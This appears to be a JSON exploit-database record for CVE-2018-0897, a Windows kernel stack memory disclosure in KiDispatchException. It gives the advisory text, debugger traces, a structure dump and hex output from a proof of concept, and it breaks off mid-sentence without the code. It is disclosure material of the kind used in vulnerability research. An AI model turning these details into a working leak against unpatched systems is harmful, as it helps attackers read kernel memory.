{
    "text": "ecve : CVE-2018-0897 ， title : Microsoft Windows Kernel - 'nt ! KiDispatchException' 64-bit Stack Memory Disclosure - Windows_x86-64 dos Exploit ， verified : Verified ， exploit_detail : / *  ， We have discovered a new Windows kernel memory disclosure vulnerability in the creation and copying of a EXCEPTION_RECORD structure to user-mode memory while passing execution to a user-mode exception handler. The vulnerability affects 64-bit versions of Windows 7 to 10. ， The leak was originally detected under the following stack trace ( Windows 7 )  :  ， --- cut --- ， kd> k ，  # Child-SP RetAddr Call Site ， 00 fffff880`040b7e18 fffff800`026ca362 nt ! memcpy+0x3 ， 01 fffff880`040b7e20 fffff800`026db3bc nt ! KiDispatchException+0x421 ， 02 fffff880`040b84b0 fffff800`0268fafb nt ! KiRaiseException+0x1b4 ， 03 fffff880`040b8ae0 fffff800`0268d093 nt ! NtRaiseException+0x7b ， 04 fffff880`040b8c20 00000000`74b5cb49 nt ! KiSystemServiceCopyEnd+0x13 ， --- cut --- ， and more specifically in the copying of the EXCEPTION_RECORD structure :  ， --- cut --- ， kd> dt _EXCEPTION_RECORD @ rdx ， ntdll ! _EXCEPTION_RECORD ， +0x000 ExceptionCode : 0n1722 ， +0x004 ExceptionFlags : 1 ， +0x008 ExceptionRecord :  ( null )  ， +0x010 ExceptionAddress : 0x00000000`765fc54f Void ， +0x018 NumberParameters : 0 ， +0x020 ExceptionInformation :  [ 15 ] 0xbbbbbbbb`bbbbbbbb ， --- cut --- ， In that structure , the entire \"ExceptionInformation\" array consisting of 15 * 8=120 bytes is left uninitialized and provided this way to the ring-3 client. The overall EXCEPTION_RECORD structure ( which contains the ExceptionInformation in question ) is allocated in the stack frame of the nt ! KiRaiseException function. ， Based on some cursory code analysis and manual experimentation , we believe that the kernel only fills as many ULONG_PTR's as the .NumberParameters field is set to ( but not more than EXCEPTION_MAXIMUM_PARAMETERS )  , while the remaining entries of the array are never written to. As a result , running the attached proof-of-concept program reveals 120 bytes of kernel stack memory ( set to the 0x41 marker with stack-spraying to illustrate the problem ) . An example output is as follows :  ， --- cut --- ， 00000000 : 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ， 00000010 : 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ， 00000020 : 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ， 00000030 : 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ， 00000040 : 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ， 00000050 : 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ， 00000060 : 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ， 00000070 : 41 41 41 41 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? AAAAAAAA........ ， --- cut --- ， If we replace the stack-spraying function call in the code with a",
    "time": "2018-03-20"
}